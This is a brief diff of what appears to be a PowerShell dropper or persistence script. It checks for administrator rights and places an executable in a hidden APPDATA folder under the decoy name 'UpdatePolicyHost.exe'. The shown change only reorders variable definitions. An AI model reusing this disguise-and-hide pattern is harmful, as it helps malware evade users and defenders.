@@ -4,9 +4,9 @@ If (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdent
     exit
 }
 
-$hidden_path = $env:APPDATA + "\UpdatePolicyHost"
-$dummy_name = "UpdatePolicyHost.exe"
 $dummy_name_no_exe = "UpdatePolicyHost"
+$hidden_path = $env:APPDATA + "\$dummy_name_no_exe"
+$dummy_name = "$dummy_name_no_exe.exe"
 $cwd_path = Split-Path -Path $PSCommandPath -Parent -Resolve
 
 if (!(Test-Path "$hidden_path")){
